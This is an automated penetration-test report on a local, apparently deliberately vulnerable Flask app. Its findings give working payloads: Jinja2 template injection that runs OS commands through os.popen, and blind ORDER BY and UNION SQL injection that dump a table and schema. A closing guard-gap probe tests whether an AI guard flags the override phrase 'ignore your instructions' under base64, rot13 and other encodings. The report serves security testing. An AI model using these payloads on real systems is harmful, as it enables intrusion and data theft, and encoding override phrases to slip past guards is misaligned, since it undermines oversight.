# Security scan — e2e-postprobe-fixed

- target: `http://127.0.0.1:8098` (local)
- isolation: direct — no Tor for local targets (Arti has no loopback route)
- strix: strix-paid · 737s · run /opt/ares/strix/strix_runs/test-vuln-hard_424b
- started 2026-11-10T06:33:04Z · duration 1053s

## Findings

### [CRITICAL] Unauthenticated Jinja2 Server-Side Template Injection to Remote Code Execution in POST /render (tpl)

The `tpl` form field of `POST /render` is passed directly to Flask's `render_template_string`, so the value is compiled by the active Jinja2 environment as template source rather than rendered as data. An unauthenticated attacker can therefore evaluate arbitrary Jinja2 expressions and escalate through reachable Python objects to execute operating-system commands on the server. The module docstring describes the sink as "Mako SSTI", but the imported function compiles Jinja2, which is what actually executes.

Agent PoC:

1. Start the application (a private copy of `app.py` was used with its own seeded database, bound to a test port, so the original directory was not modified).
2. Send a benign baseline request to prove the field is normally reflected as data: POST `tpl=hello`. The response body is `hello`.
3. Send a template expression as the same field: POST `tpl={{7*7}}`. The response body is `49`.
4. Send a second, different expression to rule out coincidence or hard-coded reflection: POST `tpl={{7*8}}`. The response body is `56`.
5. Fingerprint the engine: POST `tpl={{7*'7'}}` returns `7777777` and POST `tpl={{self.__class__.__mro__}}` returns `<class 'jinja2.runtime.TemplateReference'>`, identifying Jinja2. Mako `${7*7}` and ERB `<%= 7*7 %>` are returned literally.
6. Confirm access to framework globals: POST `tpl={{config}}` returns the fully rendered Flask configuration object.
7. Reach code execution: POST `tpl={{cycler.__init__.__globals__.os.popen("id").read()}}` returns `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`.
8. Confirm arbitrary command execution beyond identity: POST `tpl={{cycler.__init__.__globals__.os.popen("uname -a").read()}}` returns the host kernel banner, and POST `tpl={{cycler.__init__.__globals__.os.popen("cat <path>/marker.txt").read()}}` returns the contents of a marker file created for the test.
9. Confirm the chain is not specific to

### [HIGH] SQL Injection in GET /orders sort parameter (ORDER BY clause)

The `sort` query parameter of `GET /orders` is interpolated directly into the SQL `ORDER BY` clause with an f-string instead of being restricted to a fixed set of column names. An unauthenticated attacker can inject arbitrary SQL expressions, including sub-selects, turning the endpoint into a blind SQL-injection oracle over the whole database. The hidden `note` column — never part of this route's projected columns — and the database schema were both extracted through it.

Agent PoC:

1. Start the application from a private working copy on a non-conflicting port so the workspace directory is untouched.
2. Send the benign baseline `GET /orders?sort=id` and record the three-row response as the negative control.
3. Send `GET /orders?sort=4`. Observe `HTTP 500` and `1st ORDER BY term out of range - should be between 1 and 3`, establishing the injection point and the three-column projection.
4. Send the boolean-TRUE payload `GET /orders?sort=(CASE WHEN (SELECT substr(note,1,5) FROM orders WHERE id=1)="flag{" THEN id ELSE -id END)`. Observe rows ordered `1,2,3`.
5. Send the boolean-FALSE control with an identical payload shape but a false predicate (`="zzzz!"`). Observe rows ordered `3,2,1`. The ordering difference between steps 4 and 5 is the extraction oracle.
6. Run the automated binary-search extractor to recover `note` for every row plus `sqlite_version()`; results include `flag{orderby_ok}`.
7. Repeat the oracle against `sqlite_master` to confirm schema access from the same injection point.

### [HIGH] SQL Injection in POST /orders/by-sku via JSON body sku field

The `sku` field of the JSON body accepted by `POST /orders/by-sku` is interpolated into a single-quoted SQL string literal with an f-string instead of being bound as a parameter. An unauthenticated attacker can break out of the literal, append a `UNION SELECT`, and read arbitrary rows and schema metadata. A single request returns every row of the `orders` table — including the `note` values of rows the caller never asked for — and the `sqlite_master` DDL.

Agent PoC:

1. Run the application from a private working copy on a non-conflicting port so the workspace directory is untouched.
2. Send the benign baseline `POST /orders/by-sku` with body `{"sku": "alpha"}`. Observe exactly one row returned, as intended.
3. Send the same request with body `{"sku": "zzz' UNION SELECT id,sku,note FROM orders --"}`. Observe all three rows returned with their `note` values, including `flag{orderby_ok}`.
4. Send `{"sku": "zzz' UNION SELECT 99,sqlite_version(),(SELECT group_concat(note) FROM orders) --"}` to confirm arbitrary expressions and aggregation in the injected projection.
5. Send `{"sku": "zzz' UNION SELECT 1,name,sql FROM sqlite_master --"}` to retrieve the schema DDL.
6. Compare step 2 against steps 3-5: the legitimate query was asked for one SKU, and the injected responses disclose the entire table and schema.

## Secret scan (betterleaks)

- **50 secret leak(s) found** (values redacted)

  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-api-key` · /repo/app.log:5559
  - `generic-credential-uri` · /repo/app.log:8536
  - `generic-credential-uri` · /repo/app.log:8537
  - `generic-credential-uri` · /repo/app.log:8538
  - `generic-credential-uri` · /repo/app.log:8539
  - `generic-credential-uri` · /repo/app.log:8540
  - `generic-credential-uri` · /repo/app.log:8541
  - `generic-credential-uri` · /repo/app.log:8542
  - `generic-credential-uri` · /repo/app.log:8543
  - `generic-credential-uri` · /repo/app.log:8544
  - `generic-credential-uri` · /repo/app.log:8545
  - `generic-credential-uri` · /repo/app.log:8546
  - `generic-credential-uri` · /repo/app.log:8547

## Independent confirmation

- sqlmap: `{"url": "http://127.0.0.1:8098/orders?sort=1", "injectable": true, "rc": 0, "dbms": "SQLite", "techniques": ["boolean-based blind"], "tables": ["orders"], "dump_rc": 0, "dump_rows": 3, "dumped_table": "orders", "sensitive_exposed": true, "sample": ["| 1  | 3   | alpha | flag{orderby_ok} |", "| 2  | 7   | beta  | nothing          |", "| 3  | 1   | gamma | x                |"], "columns": "| id | qty | sku   | note             |"}`
- sqlmap (POST body): `{"url": "http://127.0.0.1:8098/orders/by-sku", "injectable": true, "rc": 0, "method": "POST", "data_template": "{\"sku\": \"1\"}", "dbms": "SQLite", "techniques": ["UNION query", "boolean-based blind"], "tables": ["orders"], "dump_rc": 0, "dump_rows": 3, "dumped_table": "orders", "sensitive_exposed": true, "sample": ["| 1  | 3   | alpha | flag{orderby_ok} |", "| 2  | 7   | beta  | nothing          |", "| 3  | 1   | gamma | x                |"], "columns": "| id | qty | sku   | note             |"}`
- injection proof (cmdi/traversal): `{"cmdi": [], "traversal": [], "default_exec": [], "requests": 32}`
- sstimap: `{"url": "http://127.0.0.1:8098/render", "vulnerable": true, "confidence": "high", "engine": "Jinja2", "rce": true, "rc": 0, "post_param": "tpl", "post_data_type": "form", "via": "POST body"}`
- xsstrike: `{"vectors": 0}`
- nmap: `{"host": "127.0.0.1", "port": 8098, "services": [["unknown", "1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :"]], "rc": 0}`
- ffuf: paths=1
- nuclei: hits=0
- metasploit: `{"server": "Werkzeug/3.0.1 Python/3.12.3", "module": null, "rc": 0, "candidates": ["exploit/multi/http/werkzeug_debug_rce", "exploit/multi/http/werkzeug_debug_rce"]}`
- sweep: `{"candidates": 14, "sstimap_hits": [], "sstimap_low": [], "xsstrike_hits": []}`

## Guard-gap probe (tripwire)

- transforms flagged: 100% (flag>=0.6, block>=0.9)
- control ('ignore your instructions'): OK · composite 1.0
- guard gaps (below flag threshold): 0/12
  - identity: mean 0.6 · flag 100% · block 0%
  - base64: mean 0.6 · flag 100% · block 0%
  - base64x2: mean 0.6 · flag 100% · block 0%
  - rot13: mean 0.6 · flag 100% · block 0%
  - hex_escape: mean 0.6 · flag 100% · block 0%
  - unicode_escape: mean 0.6 · flag 100% · block 0%

## Since last scan

- new: 3 · persisting: 0 · resolved: 0 · active: 3
  - NEW [195b0820e429080f] Unauthenticated Jinja2 Server-Side Template Injection to Remote Code Execution in POST /render (tpl)
  - NEW [d65cd2b288aeb07c] SQL Injection in GET /orders sort parameter (ORDER BY clause)
  - NEW [04ecb6dd9b3eee01] SQL Injection in POST /orders/by-sku via JSON body sku field

## Receipt

- receipt: `a25d9796b55bcbc8efc4f32687a6ffc8750035578e43c9fc4168313102a5a7fc`
- merkle: `1affc63fce1c3219661e13fc56b60e2f57f735349525b007d4a4ef4a9eddad02`
- chain_index: 0 · prev: `None`
- artifacts: 20 · diagnostics: 3
- verify: `python3 /opt/ares/okf_receipt.py verify /opt/ares/security_receipts/e2e-postprobe-fixed/a25d9796b55bcbc8.json --files`
